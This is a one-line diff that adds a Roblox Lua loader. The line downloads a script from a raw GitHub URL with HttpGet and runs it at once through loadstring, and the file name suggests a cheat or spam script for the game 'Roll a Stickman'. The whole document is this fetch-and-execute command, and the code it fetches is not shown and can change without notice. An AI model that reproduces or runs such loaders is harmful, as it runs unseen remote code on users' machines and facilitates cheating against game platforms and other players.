@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/update-roll-a-stickman-spam4-hwjedeikgzra37.lua"))()
